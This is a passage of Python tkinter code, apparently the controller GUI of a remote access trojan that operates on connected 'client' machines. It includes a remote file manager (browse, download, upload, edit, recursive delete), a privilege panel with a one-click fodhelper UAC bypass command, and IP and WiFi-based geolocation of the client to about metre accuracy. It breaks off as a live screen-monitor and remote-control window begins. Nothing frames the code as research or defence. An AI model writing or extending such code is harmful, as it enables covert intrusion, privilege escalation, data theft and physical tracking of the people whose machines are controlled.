    win.title("📁 Remote File Manager")
    win.geometry("900x650")
    win.minsize(700, 500)
    win.configure(bg="#F5F5F5")
    g.file_manager_window = win

    # Track current path in window instance
    win.current_path = ""
    win.last_requested_path = ""

    # Header frame
    header = tk.Frame(win, bg="#00897B", height=60)
    header.pack(fill="x")
    header.pack_propagate(False)
    tk.Label(header, text="📁  Remote File Manager", font=("Segoe UI", 14, "bold"), bg="#00897B", fg="white").pack(side="left", padx=20)

    # Status/loading label on header right
    status_lbl = tk.Label(header, text="", font=("Segoe UI", 10, "italic"), bg="#00897B", fg="#E0F2F1")
    status_lbl.pack(side="right", padx=20)
    win.status_lbl = status_lbl

    # Navigation Frame
    nav_frame = tk.Frame(win, bg="#FAFAFA", padx=15, pady=10, relief="solid", bd=1)
    nav_frame.pack(fill="x")

    # Up Button
    up_btn = tk.Button(nav_frame, text="⬆️ Up", font=("Segoe UI", 10, "bold"), bg="#E0F2F1", fg="#00796B",
                       relief="flat", padx=10, cursor="hand2")
    up_btn.pack(side="left", padx=(0, 5))
    win.up_btn = up_btn

    # Drives Button
    drives_btn = tk.Button(nav_frame, text="💻 Drives", font=("Segoe UI", 10, "bold"), bg="#E0F2F1", fg="#00796B",
                           relief="flat", padx=10, cursor="hand2")
    drives_btn.pack(side="left", padx=5)
    win.drives_btn = drives_btn

    # Path Entry
    tk.Label(nav_frame, text="Path:", font=("Segoe UI", 10), bg="#FAFAFA").pack(side="left", padx=(5, 5))
    path_var = tk.StringVar()
    path_entry = tk.Entry(nav_frame, textvariable=path_var, font=("Segoe UI", 10), relief="solid", bd=1)
    path_entry.pack(side="left", fill="x", expand=True, padx=5, ipady=3)
    win.path_entry = path_entry
    win.path_var = path_var

    # Go Button
    go_btn = tk.Button(nav_frame, text="Go", font=("Segoe UI", 10, "bold"), bg="#00897B", fg="white",
                       relief="flat", padx=15, cursor="hand2")
    go_btn.pack(side="left", padx=5)
    win.go_btn = go_btn

    # Refresh Button
    refresh_btn = tk.Button(nav_frame, text="🔄 Refresh", font=("Segoe UI", 10), bg="#FAFAFA", fg="#00897B",
                            relief="solid", bd=1, padx=12, cursor="hand2")
    refresh_btn.pack(side="left", padx=5)
    win.refresh_btn = refresh_btn

    # Main Area: Treeview
    tree_frame = tk.Frame(win, bg="#FFFFFF")
    tree_frame.pack(fill="both", expand=True, padx=15, pady=15)

    columns = ("Name", "Type", "Size (KB)")
    tree = ttk.Treeview(tree_frame, columns=columns, show="headings", selectmode="browse")
    tree.heading("Name", text="Name", anchor="w")
    tree.heading("Type", text="Type", anchor="center")
    tree.heading("Size (KB)", text="Size (KB)", anchor="e")

    tree.column("Name", width=450, anchor="w")
    tree.column("Type", width=120, anchor="center")
    tree.column("Size (KB)", width=120, anchor="e")

    vsb = ttk.Scrollbar(tree_frame, orient="vertical", command=tree.yview)
    hsb = ttk.Scrollbar(tree_frame, orient="horizontal", command=tree.xview)
    tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)

    vsb.pack(side="right", fill="y")
    hsb.pack(side="bottom", fill="x")
    tree.pack(side="left", fill="both", expand=True)
    win.tree = tree

    # Treeview double-click binding
    tree.bind("<Double-1>", lambda e: on_tree_double_click(win))

    # Right-click context menu binding
    tree.bind("<Button-3>", lambda e: show_context_menu(e, win))
    tree.bind("<Button-2>", lambda e: show_context_menu(e, win))

    # Wire up button commands
    up_btn.config(command=lambda: navigate_up(win))
    drives_btn.config(command=lambda: request_file_browser("DRIVES"))
    go_btn.config(command=lambda: request_file_browser(path_var.get()))
    refresh_btn.config(command=lambda: request_file_browser(win.current_path))
    path_entry.bind("<Return>", lambda e: request_file_browser(path_var.get()))

    # Helper function to show loading state
    def show_loading(msg):
        status_lbl.config(text=msg)
        up_btn.config(state="disabled")
        drives_btn.config(state="disabled")
        go_btn.config(state="disabled")
        refresh_btn.config(state="disabled")
        path_entry.config(state="disabled")

    # Helper function to enable controls
    def enable_controls():
        up_btn.config(state="normal")
        drives_btn.config(state="normal")
        go_btn.config(state="normal")
        refresh_btn.config(state="normal")
        path_entry.config(state="normal")
        status_lbl.config(text="")

    win.show_loading = show_loading
    win.enable_controls = enable_controls
    win.refresh = lambda: request_file_browser(win.current_path)

    # WM_DELETE_WINDOW handler
    def on_close():
        g.file_manager_window = None
        win.destroy()

    win.protocol("WM_DELETE_WINDOW", on_close)


def show_file_manager(current_path, items):
    """Populate/refresh the visual File Manager treeview."""
    win = g.file_manager_window
    if not win or not win.winfo_exists():
        return

    win.current_path = current_path
    win.path_var.set(current_path)
    win.enable_controls()

    # Clear old items
    win.tree.delete(*win.tree.get_children())

    # Populate
    for item in items:
        name = item.get("name", "")
        is_dir = item.get("is_dir", False)
        size = item.get("size", 0.0)

        item_type = "Folder" if is_dir else "File"
        size_str = "" if is_dir else f"{size}"

        win.tree.insert("", "end", values=(name, item_type, size_str))


def navigate_up(win):
    current = win.current_path.strip()
    if not current or current == "System Drives":
        return
    # Detect separator style
    if "\\" in current:
        # Windows-style path
        parts = current.rstrip("\\").split("\\")
        if len(parts) > 1:
            parent = "\\".join(parts[:-1])
            if parent.endswith(":"):
                parent += "\\"
            request_file_browser(parent)
        elif len(parts) == 1 and parts[0].endswith(":"):
            # Already at root of drive, e.g. "C:"
            request_file_browser("DRIVES")
    else:
        # Unix-style path
        parts = current.rstrip("/").split("/")
        if len(parts) > 1:
            parent = "/".join(parts[:-1])
            if not parent:
                parent = "/"
            request_file_browser(parent)
        elif len(parts) == 1:
            request_file_browser("/")


def on_tree_double_click(win):
    selected = win.tree.selection()
    if not selected:
        return
    item = win.tree.item(selected[0])
    name = item["values"][0]
    item_type = item["values"][1]

    if item_type == "Folder":
        current = win.current_path
        if not current or current == "System Drives":
            new_path = name
        else:
            if "\\" in current:
                sep = "\\"
            else:
                sep = "/"
            
            if current.endswith(sep):
                new_path = f"{current}{name}"
            else:
                new_path = f"{current}{sep}{name}"
        
        request_file_browser(new_path)


def show_context_menu(event, win):
    if win.current_path == "System Drives":
        # No file operations on virtual drives folder itself, just allow opening them
        item_id = win.tree.identify_row(event.y)
        if item_id:
            win.tree.selection_set(item_id)
            selected = win.tree.selection()
            if selected:
                item = win.tree.item(selected[0])
                name = item["values"][0]
                
                menu = tk.Menu(win.tree, tearoff=0)
                menu.add_command(label="📁 Open Drive", command=lambda: request_file_browser(name))
                menu.post(event.x_root, event.y_root)
        return

    # Identify item at mouse position
    item_id = win.tree.identify_row(event.y)
    if item_id:
        win.tree.selection_set(item_id)
    
    menu = tk.Menu(win.tree, tearoff=0)
    
    selected = win.tree.selection()
    if selected:
        item = win.tree.item(selected[0])
        name = item["values"][0]
        item_type = item["values"][1]
        
        current = win.current_path
        if "\\" in current:
            sep = "\\"
        else:
            sep = "/"
        
        if current.endswith(sep):
            full_path = f"{current}{name}"
        else:
            full_path = f"{current}{sep}{name}"
        
        if item_type == "Folder":
            menu.add_command(label="📁 Open Folder", command=lambda: request_file_browser(full_path))
            menu.add_separator()
            menu.add_command(label="❌ Delete Folder (Recursive)", command=lambda: delete_item(full_path, is_dir=True))
        else:
            menu.add_command(label="📝 Edit File", command=lambda: request_file_editor(full_path))
            menu.add_command(label="📥 Download File", command=lambda: download_item(full_path, name))
            menu.add_separator()
            menu.add_command(label="❌ Delete File", command=lambda: delete_item(full_path, is_dir=False))
            
        menu.add_separator()
    
    if win.current_path:
        menu.add_command(label="📤 Upload File here...", command=lambda: upload_item_to(win.current_path))
        
    menu.post(event.x_root, event.y_root)


def delete_item(full_path, is_dir):
    if is_dir:
        confirm = messagebox.askyesno(
            "⚠️ WARNING: Recursive Delete",
            f"Are you sure you want to permanently delete this folder:\n{full_path}\n\nand ALL of its contents?\nThis action cannot be undone!",
            icon="warning"
        )
    else:
        confirm = messagebox.askyesno(
            "Confirm Delete",
            f"Are you sure you want to delete this file:\n{full_path}?"
        )
        
    if confirm:
        import gui_commands as cmds
        g.terminal_output.delete("input_start", "end")
        g.terminal_output.insert(tk.END, f"DELETE_FILE:{full_path}\n", "command")
        g.terminal_output.mark_set("input_start", "end-1c")
        threading.Thread(target=cmds.execute_command, args=(f"DELETE_FILE:{full_path}", f"Delete: {full_path}"), daemon=True).start()


def download_item(full_path, name):
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client!")
        return
    g.terminal_output.delete("input_start", "end")
    g.terminal_output.insert(tk.END, f"DOWNLOAD:{full_path}\n", "command")
    g.terminal_output.mark_set("input_start", "end-1c")
    import gui_commands as cmds
    threading.Thread(target=cmds.execute_command, args=(f"DOWNLOAD:{full_path}", f"Download: {full_path}"), daemon=True).start()


def upload_item_to(current_path):
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client!")
        return
    filepath = filedialog.askopenfilename(title="Select file to upload")
    if filepath:
        try:
            with open(filepath, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            filename = os.path.basename(filepath)
            
            if "\\" in current_path:
                sep = "\\"
            else:
                sep = "/"
                
            if current_path.endswith(sep):
                target_path = f"{current_path}{filename}"
            else:
                target_path = f"{current_path}{sep}{filename}"
                
            cmd = f"UPLOAD:{target_path}:{file_data}"
            g.terminal_output.delete("input_start", "end")
            g.terminal_output.insert(tk.END, f"Uploading {filename} to {current_path}...\n", "command")
            g.terminal_output.mark_set("input_start", "end-1c")
            import gui_commands as cmds
            threading.Thread(target=cmds.execute_command, args=(cmd, f"Upload: {filename}"), daemon=True).start()
        except Exception as e:
            messagebox.showerror("Upload Error", str(e))


# ── Visual File Editor ────────────────────────────────────────────────────────

def request_file_editor(path):
    """Send request to read text file contents from remote client."""
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client first!")
        return
        
    path = path.strip()
    
    # Singleton check: if editor is already open, verify before replacing it
    if g.file_editor_window and g.file_editor_window.winfo_exists():
        if g.file_editor_window.is_dirty:
            confirm = messagebox.askyesno(
                "Unsaved Changes",
                "The active editor has unsaved changes. Are you sure you want to open another file and discard those changes?",
                icon="warning"
            )
            if not confirm:
                g.file_editor_window.lift()
                g.file_editor_window.focus_force()
                return
        g.file_editor_window.destroy()
        g.file_editor_window = None

    if g.file_manager_window and g.file_manager_window.winfo_exists():
        g.file_manager_window.show_loading(f"Opening {os.path.basename(path)}...")

    import gui_commands as cmds
    threading.Thread(
        target=cmds.execute_command,
        args=(f"READ_TEXT_FILE:{path}", f"Read File: {path}"),
        daemon=True,
        name=f"ReadText-{path[:15]}"
    ).start()


def open_file_editor(filepath, encoding, content):
    """Open the crash-proof Visual File Editor window."""
    win = tk.Toplevel(g.root)
    win.title(f"📝 File Editor — {os.path.basename(filepath)}")
    win.geometry("800x600")
    win.minsize(600, 400)
    win.configure(bg="#F5F5F5")
    g.file_editor_window = win

    win.filepath = filepath
    win.encoding = encoding
    win.is_dirty = False

    # Header frame
    header = tk.Frame(win, bg="#00796B", height=55)
    header.pack(fill="x")
    header.pack_propagate(False)
    
    title_lbl = tk.Label(header, text=f"📝 {os.path.basename(filepath)}", font=("Segoe UI", 12, "bold"), bg="#00796B", fg="white")
    title_lbl.pack(side="left", padx=20)
    
    encoding_lbl = tk.Label(header, text=f"Encoding: {encoding.upper()}", font=("Segoe UI", 9, "italic"), bg="#00796B", fg="#B2DFDB")
    encoding_lbl.pack(side="right", padx=20)

    # Editor text area
    from tkinter import scrolledtext
    editor = scrolledtext.ScrolledText(win, font=("Consolas", 10), bg="#FFFFFF", fg="#212121", relief="flat", wrap="word", undo=True)
    editor.pack(fill="both", expand=True, padx=15, pady=(15, 10))
    editor.insert("1.0", content)
    editor.edit_reset()  # Reset undo history

    # Unsaved changes indicator
    def on_content_change(event=None):
        if not win.is_dirty:
            win.is_dirty = True
            win.title(f"📝 *File Editor — {os.path.basename(filepath)}")
            title_lbl.config(text=f"📝 *{os.path.basename(filepath)}")
    
    editor.bind("<<Modified>>", lambda e: [on_content_change(), editor.edit_modified(False)])

    # Bottom button controls
    btn_frame = tk.Frame(win, bg="#F5F5F5", height=55)
    btn_frame.pack(fill="x", side="bottom")
    
    status_msg = tk.Label(btn_frame, text="", font=("Segoe UI", 10, "italic"), bg="#F5F5F5", fg="#616161")
    status_msg.pack(side="left", padx=20)

    def trigger_save():
        # Read text, convert to base64
        updated_text = editor.get("1.0", "end-1c")
        try:
            import base64
            b64_content = base64.b64encode(updated_text.encode("utf-8")).decode("utf-8")
        except Exception as e:
            messagebox.showerror("Save Error", f"Encoding conversion failed:\n{e}")
            return

        # Disable save button (prevent race conditions)
        save_btn.config(state="disabled")
        close_btn.config(state="disabled")
        editor.config(state="disabled")
        status_msg.config(text="Saving changes...")
        
        # Build command: WRITE_TEXT_FILE:<path>|<encoding>|<base64>
        cmd = f"WRITE_TEXT_FILE:{filepath}|{encoding}|{b64_content}"
        
        import gui_commands as cmds
        threading.Thread(
            target=cmds.execute_command,
            args=(cmd, f"Save File: {filepath}"),
            daemon=True,
            name=f"SaveText-{os.path.basename(filepath)[:15]}"
        ).start()

    def on_save_success():
        win.is_dirty = False
        win.title(f"📝 File Editor — {os.path.basename(filepath)}")
        title_lbl.config(text=f"📝 {os.path.basename(filepath)}")
        save_btn.config(state="normal")
        close_btn.config(state="normal")
        editor.config(state="normal")
        status_msg.config(text="✓ Saved successfully.")

    def on_save_failed():
        save_btn.config(state="normal")
        close_btn.config(state="normal")
        editor.config(state="normal")
        status_msg.config(text="❌ Save failed.")

    win.on_save_success = on_save_success
    win.on_save_failed = on_save_failed

    save_btn = tk.Button(btn_frame, text="💾 Save File", command=trigger_save, font=("Segoe UI", 10, "bold"), bg="#00897B", fg="white", relief="flat", padx=20, pady=8, cursor="hand2")
    save_btn.pack(side="right", padx=10, pady=8)

    def close_editor():
        if win.is_dirty:
            confirm = messagebox.askyesno(
                "Unsaved Changes",
                "You have unsaved changes. Are you sure you want to close the editor and discard those changes?",
                icon="warning"
            )
            if not confirm:
                return
        g.file_editor_window = None
        win.destroy()

    close_btn = tk.Button(btn_frame, text="✗ Close", command=close_editor, font=("Segoe UI", 10), bg="#757575", fg="white", relief="flat", padx=20, pady=8, cursor="hand2")
    close_btn.pack(side="right", padx=15, pady=8)

    win.protocol("WM_DELETE_WINDOW", close_editor)


# ── Privilege Info & UAC Bypass ───────────────────────────────────────────────

def request_privilege_info():
    """Send PRIV_INFO command to active client."""
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client first!")
        return
    import gui_commands as cmds
    threading.Thread(target=cmds.execute_command,
                     args=("PRIV_INFO", "Get Privilege Info"), daemon=True).start()


def show_privilege_window(data):
    """Display a privilege info + UAC bypass window."""
    integrity  = data.get("integrity", "Unknown")
    user       = data.get("user", "N/A")
    is_admin   = data.get("is_admin", False)
    uac_on     = data.get("uac_enabled", False)
    elevated   = data.get("elevated", False)
    os_name    = data.get("os", "Windows")

    # Colour theme by integrity
    badge_colors = {
        "Low":    ("#EF5350", "🔴"),
        "Medium": ("#FFA726", "🟡"),
        "High":   ("#66BB6A", "🟢"),
        "System": ("#29B6F6", "🔵"),
        "Root":   ("#29B6F6", "🔵"),
        "User":   ("#FFA726", "🟡"),
    }
    badge_bg, badge_icon = badge_colors.get(integrity, ("#90A4AE", "⚪"))

    win = tk.Toplevel(g.root)
    win.title("👑 Privilege Info")
    win.geometry("500x480")
    win.configure(bg="#0D0D1A")
    win.resizable(False, False)

    # ── Header ─────────────────────────────────────────────────────────────────
    hdr = tk.Frame(win, bg="#1A0A2E", height=65)
    hdr.pack(fill="x")
    hdr.pack_propagate(False)
    tk.Label(hdr, text="👑  PRIVILEGE INSPECTOR", font=("Segoe UI", 13, "bold"),
             bg="#1A0A2E", fg="#00E5FF").pack(side="left", padx=20, pady=15)

    badge = tk.Label(hdr, text=f"{badge_icon} {integrity.upper()}",
                     font=("Segoe UI", 11, "bold"),
                     bg=badge_bg, fg="white", padx=14, pady=4)
    badge.pack(side="right", padx=20, pady=17)

    # ── Info Cards ─────────────────────────────────────────────────────────────
    body = tk.Frame(win, bg="#0D0D1A")
    body.pack(fill="both", expand=True, padx=20, pady=15)

    rows = [
        ("👤 Username",       user),
        ("💻 OS",             os_name),
        ("🛡️ Admin Group",    "Yes ✅" if is_admin else "No ❌"),
        ("🔒 UAC Enabled",    "Yes (ON)" if uac_on else "No (OFF)"),
        ("🔑 Token Integrity", f"{badge_icon} {integrity}"),
        ("⚡ Elevated",       "Yes — HIGH token ✅" if elevated else "No — MEDIUM token ⚠️"),
    ]

    for label, value in rows:
        row = tk.Frame(body, bg="#131325", height=44)
        row.pack(fill="x", pady=3)
        row.pack_propagate(False)
        tk.Label(row, text=label, font=("Segoe UI", 10, "bold"),
                 bg="#131325", fg="#78909C", width=18, anchor="w").pack(side="left", padx=12)
        tk.Label(row, text=value, font=("Segoe UI", 11),
                 bg="#131325", fg="#E0E0E0", anchor="w").pack(side="left", padx=5)

    # ── UAC Bypass Panel ───────────────────────────────────────────────────────
    sep = tk.Frame(body, bg="#2A2A4A", height=2)
    sep.pack(fill="x", pady=12)

    if elevated:
        tk.Label(body, text="✅  Already running as HIGH integrity — no bypass needed.",
                 font=("Segoe UI", 10), bg="#0D0D1A", fg="#66BB6A").pack(pady=8)
    elif not is_admin:
        tk.Label(body, text="❌  Not in admin group — bypass impossible.\n    Need social engineering or exploit first.",
                 font=("Segoe UI", 10), bg="#0D0D1A", fg="#EF5350", justify="left").pack(pady=8)
    else:
        tk.Label(body, text="⚡  Admin in group but MEDIUM integrity (UAC blocking)\n    → fodhelper.exe bypass available!",
                 font=("Segoe UI", 10), bg="#0D0D1A", fg="#FFA726", justify="left").pack(pady=(0, 10))

        def do_bypass():
            bypass_btn.config(state="disabled", text="⏳ Bypassing...")
            import gui_commands as cmds
            threading.Thread(target=cmds.execute_command,
                             args=("UAC_BYPASS", "UAC Bypass"), daemon=True).start()
            win.after(3000, lambda: bypass_btn.config(state="normal",
                                                       text="🔥 Execute UAC Bypass (fodhelper)"))

        bypass_btn = tk.Button(
            body,
            text="🔥 Execute UAC Bypass (fodhelper)",
            command=do_bypass,
            font=("Segoe UI", 12, "bold"),
            bg="#B71C1C", fg="white",
            activebackground="#D32F2F",
            relief="flat", padx=20, pady=12, cursor="hand2"
        )
        bypass_btn.pack(fill="x")

    win.protocol("WM_DELETE_WINDOW", win.destroy)


# ── GeoLocation ───────────────────────────────────────────────────────────────

def show_geolocation():
    """Fetch and display GeoLocation info for the active client's IP address."""
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client first!")
        return

    with g.clients_lock:
        if g.active_client_id not in g.clients:
            messagebox.showerror("Error", "Client not found!")
            return
        client_ip = g.clients[g.active_client_id]["addr"][0]

    if g.geo_window and g.geo_window.winfo_exists():
        g.geo_window.lift()
        g.geo_window.focus_force()
        return

    # ── Window ─────────────────────────────────────────────────────────────────
    win = tk.Toplevel(g.root)
    win.title("🗺️ GeoLocation Tracker")
    win.geometry("640x700")
    win.configure(bg="#0D0D1A")
    win.resizable(True, True)
    win.minsize(560, 500)
    g.geo_window = win

    def on_close():
        g.geo_window = None
        win.destroy()
    win.protocol("WM_DELETE_WINDOW", on_close)

    # ── Header ─────────────────────────────────────────────────────────────────
    hdr = tk.Frame(win, bg="#1A0A2E", height=70)
    hdr.pack(fill="x")
    hdr.pack_propagate(False)
    tk.Label(hdr, text="🗺️  GEOLOCATION TRACKER", font=("Segoe UI", 14, "bold"),
             bg="#1A0A2E", fg="#00E5FF").pack(side="left", padx=20, pady=15)
    ip_badge = tk.Label(hdr, text=f"🌐 {client_ip}", font=("Segoe UI", 10, "bold"),
                        bg="#00BCD4", fg="white", padx=10, pady=4)
    ip_badge.pack(side="right", padx=15, pady=18)

    # ── Scrollable Canvas Body ─────────────────────────────────────────────────
    outer = tk.Frame(win, bg="#0D0D1A")
    outer.pack(fill="both", expand=True, padx=0, pady=0)

    canvas = tk.Canvas(outer, bg="#0D0D1A", highlightthickness=0)
    scrollbar = tk.Scrollbar(outer, orient="vertical", command=canvas.yview)
    canvas.configure(yscrollcommand=scrollbar.set)

    scrollbar.pack(side="right", fill="y")
    canvas.pack(side="left", fill="both", expand=True)

    body = tk.Frame(canvas, bg="#0D0D1A")
    body_window = canvas.create_window((0, 0), window=body, anchor="nw")

    def on_body_configure(event):
        canvas.configure(scrollregion=canvas.bbox("all"))
    body.bind("<Configure>", on_body_configure)

    def on_canvas_configure(event):
        canvas.itemconfig(body_window, width=event.width)
    canvas.bind("<Configure>", on_canvas_configure)

    # Mouse wheel scrolling
    def on_mousewheel(event):
        canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")
    canvas.bind("<MouseWheel>", on_mousewheel)
    body.bind("<MouseWheel>", on_mousewheel)
    win.bind("<MouseWheel>", on_mousewheel)

    # ── Loading ────────────────────────────────────────────────────────────────
    loading_lbl = tk.Label(body, text="⏳  Fetching IP location data...",
                            font=("Segoe UI", 13), bg="#0D0D1A", fg="#90A4AE")
    loading_lbl.pack(pady=50)

    # ── Shared state for coordinate updates ───────────────────────────────────
    state = {"lat": None, "lon": None, "coord_label": None,
             "acc_label": None, "maps_url": None}
    win._geo_state = state

    # ── Helper: add info row ───────────────────────────────────────────────────
    def add_row(parent, label, value, value_color="#E0E0E0"):
        row = tk.Frame(parent, bg="#131325", height=44)
        row.pack(fill="x", padx=15, pady=3)
        row.pack_propagate(False)
        tk.Label(row, text=label, font=("Segoe UI", 10, "bold"),
                 bg="#131325", fg="#78909C", width=18, anchor="w").pack(side="left", padx=12)
        lbl = tk.Label(row, text=value, font=("Segoe UI", 11),
                 bg="#131325", fg=value_color, anchor="w")
        lbl.pack(side="left", padx=5)
        return lbl

    # ── Section header helper ──────────────────────────────────────────────────
    def add_section(parent, title, color="#00E5FF"):
        tk.Label(parent, text=title, font=("Segoe UI", 10, "bold"),
                 bg="#0D0D1A", fg=color).pack(anchor="w", padx=18, pady=(14, 4))

    # ── IP Geo Fetch ───────────────────────────────────────────────────────────
    def fetch_geo():
        import urllib.request, json as _json

        def is_private(ip):
            return (ip.startswith("127.") or ip.startswith("10.") or
                    ip.startswith("192.168.") or ip == "::1" or
                    any(ip.startswith(f"172.{i}.") for i in range(16, 32)))

        try:
            lookup_ip = client_ip
            display_ip = client_ip

            if is_private(client_ip):
                try:
                    pub = urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5)
                    lookup_ip = _json.loads(pub.read().decode()).get("ip", client_ip)
                    display_ip = f"{client_ip}  →  {lookup_ip}"
                    g.root.after(0, lambda d=display_ip: ip_badge.config(text=f"🌐 {d}"))
                except Exception:
                    pass

            url = (f"http://ip-api.com/json/{lookup_ip}"
                   f"?fields=status,message,country,regionName,city,zip,"
                   f"lat,lon,isp,org,timezone,mobile,proxy,hosting")
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=8) as resp:
                data = _json.loads(resp.read().decode())

            if data.get("status") == "success":
                g.root.after(0, lambda d=data: show_ip_result(d))
            else:
                g.root.after(0, lambda m=data.get("message","err"): show_error(m))
        except Exception as e:
            g.root.after(0, lambda err=str(e): show_error(err))

    def show_error(msg):
        if not win.winfo_exists(): return
        loading_lbl.config(text=f"❌ {msg}", fg="#EF5350")

    def show_ip_result(d):
        if not win.winfo_exists(): return
        loading_lbl.destroy()

        lat, lon = d.get("lat"), d.get("lon")
        state["lat"] = lat
        state["lon"] = lon
        state["maps_url"] = f"https://www.google.com/maps?q={lat},{lon}&z=10"

        # ── IP-based Info ──────────────────────────────────────────────────────
        add_section(body, "📡  IP-BASED LOCATION  (city-level, ~5-50 km accuracy)")

        add_row(body, "🌍 Country",      d.get("country", "N/A"))
        add_row(body, "🏙️ Region/City",  f"{d.get('regionName','N/A')} / {d.get('city','N/A')}")
        add_row(body, "📮 ZIP Code",     d.get("zip", "N/A"))
        coord_lbl = add_row(body, "📍 Coordinates",
                            f"{lat}°N,  {lon}°E",
                            value_color="#00E5FF")
        state["coord_label"] = coord_lbl

        acc_lbl = add_row(body, "🎯 Accuracy",
                          "~city level  (use WiFi scan below for precise)",
                          value_color="#FFA726")
        state["acc_label"] = acc_lbl

        add_row(body, "🕐 Timezone",     d.get("timezone", "N/A"))
        add_row(body, "📡 ISP",          d.get("isp", "N/A"))
        add_row(body, "🏢 Organization", d.get("org", "N/A"))
        add_row(body, "📶 Mobile Data",  "Yes ✅" if d.get("mobile") else "No ❌")
        add_row(body, "🔒 Proxy/VPN",    "Detected ⚠️" if d.get("proxy") else "Not Detected ✅",
                value_color="#FFA726" if d.get("proxy") else "#66BB6A")
        add_row(body, "🖥️ Datacenter",   "Yes ⚠️" if d.get("hosting") else "No ✅",
                value_color="#FFA726" if d.get("hosting") else "#66BB6A")

        # ── Separator ─────────────────────────────────────────────────────────
        tk.Frame(body, bg="#2A2A4A", height=2).pack(fill="x", padx=15, pady=12)

        # ── Precise Location Section ───────────────────────────────────────────
        add_section(body, "🎯  PRECISE LOCATION  (WiFi-based, ~10-100 m accuracy)", "#FF6F00")

        info_lbl = tk.Label(
            body,
            text="Click below to scan nearby WiFi networks on the client machine\n"
                 "and triangulate using Mozilla Location Services (FREE, no API key).",
            font=("Segoe UI", 9), bg="#0D0D1A", fg="#90A4AE", justify="left"
        )
        info_lbl.pack(anchor="w", padx=18, pady=(0, 8))

        wifi_status = tk.Label(body, text="", font=("Segoe UI", 10),
                               bg="#0D0D1A", fg="#FFA726")
        wifi_status.pack(anchor="w", padx=18)

        def do_wifi_scan():
            wifi_btn.config(state="disabled", text="⏳ Scanning WiFi...")
            wifi_status.config(text="Sending WIFI_SCAN command to client...", fg="#90A4AE")
            import gui_commands as cmds
            threading.Thread(
                target=cmds.execute_command,
                args=("WIFI_SCAN", "WiFi Precise Location"),
                daemon=True
            ).start()

        wifi_btn = tk.Button(
            body, text="🎯  Scan WiFi → Get Precise Location",
            command=do_wifi_scan,
            font=("Segoe UI", 11, "bold"),
            bg="#E65100", fg="white", activebackground="#FF6F00",
            relief="flat", padx=20, pady=10, cursor="hand2"
        )
        wifi_btn.pack(fill="x", padx=15, pady=(4, 12))

        # Store references for wifi result update
        state["wifi_btn"]    = wifi_btn
        state["wifi_status"] = wifi_status

        # ── Bottom Buttons ─────────────────────────────────────────────────────
        tk.Frame(body, bg="#2A2A4A", height=2).pack(fill="x", padx=15, pady=8)

        btn_row = tk.Frame(body, bg="#0D0D1A")
        btn_row.pack(pady=10, padx=15, fill="x")

        def open_maps():
            import webbrowser
            webbrowser.open(state["maps_url"])

        def copy_coords():
            coords = f"{state['lat']}, {state['lon']}"
            win.clipboard_clear()
            win.clipboard_append(coords)
            messagebox.showinfo("Copied", f"Copied:\n{coords}")

        tk.Button(btn_row, text="🗺️  Open in Google Maps", command=open_maps,
                  font=("Segoe UI", 11, "bold"), bg="#00897B", fg="white",
                  relief="flat", padx=16, pady=10, cursor="hand2").pack(side="left", padx=6)

        tk.Button(btn_row, text="📋  Copy Coords", command=copy_coords,
                  font=("Segoe UI", 11, "bold"), bg="#3949AB", fg="white",
                  relief="flat", padx=16, pady=10, cursor="hand2").pack(side="left", padx=6)

        tk.Label(body, text="", bg="#0D0D1A").pack(pady=10)  # bottom padding

    threading.Thread(target=fetch_geo, daemon=True).start()


def update_geo_wifi_result(data):
    """Called from gui_commands.py when WIFI_SCAN response arrives."""
    if not g.geo_window or not g.geo_window.winfo_exists():
        return

    win = g.geo_window
    # Retrieve state from the geo window's attribute
    try:
        state = win._geo_state
    except AttributeError:
        return

    status   = data.get("status")
    wifi_btn = state.get("wifi_btn")
    wifi_lbl = state.get("wifi_status")

    if wifi_btn and wifi_btn.winfo_exists():
        wifi_btn.config(state="normal", text="🎯  Scan WiFi → Get Precise Location")

    if status == "error":
        if wifi_lbl and wifi_lbl.winfo_exists():
            wifi_lbl.config(text=f"❌ {data.get('message','Error')}", fg="#EF5350")
        return

    lat     = data.get("lat")
    lon     = data.get("lon")
    acc     = data.get("accuracy")  # metres
    count   = data.get("wifi_count", "?")

    if not lat or not lon:
        if wifi_lbl and wifi_lbl.winfo_exists():
            wifi_lbl.config(text="❌ No location returned from MLS.", fg="#EF5350")
        return

    state["lat"] = lat
    state["lon"] = lon
    state["maps_url"] = f"https://www.google.com/maps?q={lat},{lon}&z=18"

    method = data.get("method", "Precise")

    if state.get("coord_label") and state["coord_label"].winfo_exists():
        state["coord_label"].config(
            text=f"{lat:.6f}°N,  {lon:.6f}°E  ← 🎯 WiFi Precise",
            fg="#00FF88"
        )
    if state.get("acc_label") and state["acc_label"].winfo_exists():
        acc_txt = f"~{acc:.0f} metres  ({count} WiFi networks used)" if acc else "Unknown"
        state["acc_label"].config(text=f"🎯 {acc_txt}", fg="#00FF88")

    if wifi_lbl and wifi_lbl.winfo_exists():
        acc_txt = f"~{acc:.0f}m" if acc else "±unknown"
        wifi_lbl.config(
            text=f"✅ {method}  |  Accuracy: {acc_txt}  ({count} APs)",
            fg="#66BB6A"
        )


# ── Live Screen Monitor ───────────────────────────────────────────────────────

import time

def request_screen_monitor():
    """Start live screen monitor stream with a premium cybernetic dark UI."""
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client first!")
        return

    # Singleton check
    if g.screen_monitor_window and g.screen_monitor_window.winfo_exists():
        g.screen_monitor_window.lift()
        g.screen_monitor_window.focus_force()
        return

    import gui_commands as cmds

    # Create the window with a modern size
    win = tk.Toplevel(g.root)
    win.title("🖥️ Live Screen Monitor & Remote Control")
    win.geometry("1100x820")
    win.configure(bg="#121214")
    g.screen_monitor_window = win

    # ── Header Frame (Modern Glassy look) ────────────────────────────────────
    header = tk.Frame(win, bg="#1A1A22", height=65, highlightbackground="#2D2D3D", highlightthickness=1)
    header.pack(fill="x")
    header.pack_propagate(False)

    # Title & Subtitle Info
    tf = tk.Frame(header, bg="#1A1A22")
    tf.pack(side="left", padx=20, pady=8)
    
